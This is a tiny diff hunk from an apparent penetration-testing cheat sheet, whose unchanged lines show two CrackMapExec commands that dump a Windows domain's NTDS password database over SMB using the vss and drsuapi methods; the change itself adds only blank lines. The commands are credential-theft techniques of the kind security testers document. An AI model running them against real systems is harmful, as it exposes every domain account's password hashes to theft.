@@ -15,3 +15,5 @@ updated_at: '2023-04-10T20:25:43.693414+00:00'
 cme smb 10.10.0.202 -u username -p password --ntds vss
 cme smb 10.10.0.202 -u username -p password --ntds drsuapi #default
 ```
+
+
